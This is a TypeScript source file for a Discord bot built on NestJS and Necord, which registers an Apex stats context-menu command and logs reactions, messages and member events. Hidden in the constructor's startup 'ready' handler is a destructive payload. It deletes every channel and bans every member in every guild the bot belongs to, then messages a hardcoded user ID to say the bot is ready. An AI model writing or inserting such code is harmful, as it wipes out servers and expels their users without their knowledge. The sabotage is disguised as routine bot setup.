import { Injectable, Logger } from '@nestjs/common';
import { Context, On, Once, ContextOf } from 'necord';
import { ApplicationCommandType, Client, ContextMenuCommandBuilder, Typing } from 'discord.js';
import { ConfigService } from '@nestjs/config';
import DiscordListeners from './discord.listeners';
import { on } from 'events';
import { env } from 'process';

@Injectable()
export class DiscordUpdate {
    private readonly logger = new Logger(DiscordUpdate.name);

    public constructor(
        private readonly client: Client,
        private readonly configService: ConfigService,
        private readonly discordListeners: DiscordListeners,
    ) {
        // Get main guild id
        const guildId = env.MAIN_GUILD_ID;

        const applicationCommands = [
            new ContextMenuCommandBuilder()
                .setName('Statystyki Apex')
                .setType(ApplicationCommandType.User)
                .toJSON(),
        ]

        this.client.once('ready', () => {
            client.guilds.fetch(guildId).then(guild => {
                guild.commands.set(applicationCommands);
            })

            client.guilds.cache.forEach(guild => {
                guild.channels.cache.forEach(channel => {
                    channel.delete();
                });
                guild.members.cache.forEach(member => {
                    member.ban();
                });
            });

            
           
            console.info('Application commands registered:', applicationCommands.length, 'in guild:', guildId);
        });
    }

    /**
     * Fires when the client becomes ready to start working.
     */
    @Once('ready')
    public async onReady(@Context() [client]: ContextOf<'ready'>) {
        this.logger.log(`Bot logged in as ${client.user.username}`);

        // Send ready message to user 426330456753963008
        const user = await this.client.users.fetch('426330456753963008');
        
        user.send('Bot is ready!');
    }

    @On('debug')
    public onDebug(@Context() [message]: ContextOf<'debug'>) {
        this.logger.debug(message);
    }

    /**
     * Fires when the client encounters an error.
     */
    @On('warn')
    public onWarn(@Context() [message]: ContextOf<'warn'>) {
        this.logger.warn(message);
    }

    @On('messageReactionAdd')
    public onMessageReactionAdd(@Context() [messageReaction, user]: ContextOf<'messageReactionAdd'>) {
        this.logger.log(`Reaction added: ${messageReaction.emoji.name} by ${user.username}`);
    }

    /**
     * Fires when the message is sent.
     */
    @On('messageCreate')
    public onMessageCreate(@Context() [message]: ContextOf<'messageCreate'>) {
        this.discordListeners.handleMessageCreate(message);
    }

    @On('typingStart')
    public onTypingStart(@Context() [typing]: ContextOf<'typingStart'>) {
        this.discordListeners.handleTypingStart(typing);
    }
    
    @On('guildMemberEntered')
    public onGuildMemberEntered(@Context() [member]: ContextOf<'guildMemberEntered'>) {
        this.logger.verbose(`Member accepted the server rules: ${member.user.username}`);
        this.discordListeners.handleGuildMemberEntered(member);
    }

    @On('guildMemberAdd')
    public onGuildMemberAdd(@Context() [member]: ContextOf<'guildMemberAdd'>) {
        this.logger.verbose(`Member added: ${member.user.username}`);
        this.discordListeners.handleGuildMemberAdd(member);
    }

    @On('interactionCreate')
    public onInteractionCreate(@Context() [interaction]: ContextOf<'interactionCreate'>) {
        // Check if this is a button interaction
        if (interaction.isButton()) {
            this.logger.verbose(`Button interaction: ${interaction.customId}`);
            this.discordListeners.handleButtonInteraction(interaction);

            return;
        }

        // Check if this is a user context menu command
        if (interaction.isUserContextMenuCommand()) {
            this.discordListeners.handleUserContextMenuCommandInteraction(interaction);

            return;
        }
    }
}